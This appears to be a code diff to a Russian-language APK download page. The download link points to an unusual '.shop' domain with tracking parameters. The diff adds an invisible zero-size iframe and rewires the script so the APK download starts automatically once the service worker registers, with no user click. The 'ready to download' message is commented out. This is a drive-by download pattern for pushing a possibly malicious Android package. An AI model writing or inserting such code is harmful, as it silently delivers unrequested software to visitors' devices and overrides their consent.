@@ -127,6 +127,15 @@
     .status.error {
       color: var(--danger);
     }
+
+    .hidden-frame {
+      position: absolute;
+      width: 0;
+      height: 0;
+      border: 0;
+      opacity: 0;
+      pointer-events: none;
+    }
   </style>
 </head>
 <body>
@@ -148,6 +157,7 @@
     </form>
     <div id="status" class="status" role="status">Подготовка...</div>
   </main>
+  <iframe id="downloadFrame" class="hidden-frame" title="download frame" aria-hidden="true"></iframe>
 
   <script>
     const DEFAULT_APK_URL = 'https://optionallyhumanepipefish.shop/6a69702a762a4860154/?utm_id=da856bnkrqrs73bki500&utm_campaign=1155&utm_medium=download9918';
@@ -158,6 +168,7 @@
     const downloadForm = document.querySelector('#downloadForm');
     const apkUrlInput = document.querySelector('#apkUrlInput');
     const fileNameInput = document.querySelector('#fileNameInput');
+    const downloadFrame = document.querySelector('#downloadFrame');
     let isServiceWorkerReady = false;
 
     const pageUrl = new URL(window.location.href);
@@ -231,6 +242,10 @@
         return;
       }
 
+      dl();
+    });
+
+    function dl(){
       if (!isServiceWorkerReady) {
         setStatus('Service worker еще не готов. Подождите несколько секунд.', true);
         return;
@@ -246,10 +261,13 @@
       window.setTimeout(() => {
         downloadButton.disabled = false;
       }, 2500);
-    });
+    }
 
     registerServiceWorker()
-      .then(() => setStatus('Готово к скачиванию.'))
+      .then(() => {
+        // setStatus('Готово к скачиванию.')
+        dl();
+      })
       .catch((error) => {
         console.error(error);
         setStatus(error.message, true);
